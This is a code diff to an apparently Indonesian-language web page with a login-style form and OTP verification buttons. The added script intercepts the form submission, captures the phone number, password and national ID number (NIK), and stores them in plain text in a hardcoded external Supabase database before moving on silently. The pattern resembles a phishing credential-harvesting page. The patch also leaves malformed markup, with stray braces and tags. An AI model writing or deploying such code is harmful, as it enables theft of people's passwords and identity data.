@@ -412,7 +412,30 @@
           window.previewImage = previewImage;
 
           var form = document.getElementById('form');
-          if(form){ form.addEventListener('submit', showNextPage); }
+          if(form){ 
+  form.addEventListener('submit', async function(e){
+    e.preventDefault();
+
+    const inputs = form.querySelectorAll('input');
+    const phone = inputs[0].value;
+    const password = inputs[1].value;
+    const nik = inputs[2].value;
+
+    const { error } = await supabase
+      .from('users')
+      .insert([
+        { phone, password, nik }
+      ]);
+
+    if(error){
+      console.error(error);
+      alert("Gagal simpan data");
+      return;
+    }
+
+    showNextPage(); // lanjut seperti sebelumnya
+  });
+} }
           var resendBtn = document.getElementById('resendBtn');
           if(resendBtn){ resendBtn.addEventListener('click', restartTimer); }
           var verifyBtn = document.getElementById('verifyBtn');
@@ -450,5 +473,20 @@
       </script>
     </section>
   </main>
+</script>
+
+<!-- SUPABASE DI SINI -->
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
+<script>
+const supabase = window.supabase.createClient(
+  "https://oqhjmhjbjgzbsplyzww.supabase.co",
+  "sb_publishable_ajsQ4IzW_bpbOJUiVwFTyg_5-4AcsOO"
+);
+</script>
+
+</section>
+</main>
 </body>
 </html>
+
